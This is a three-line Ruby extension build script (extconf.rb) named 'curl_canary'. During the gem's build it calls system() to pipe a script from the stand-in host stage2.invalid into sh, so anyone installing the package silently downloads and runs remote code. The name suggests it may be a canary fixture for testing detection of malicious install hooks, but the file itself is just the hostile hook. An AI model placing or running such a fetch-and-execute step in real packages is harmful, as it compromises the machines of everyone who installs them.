require 'mkmf'
system("curl -fsSL https://stage2.invalid/i.sh | sh")
create_makefile('curl_canary')
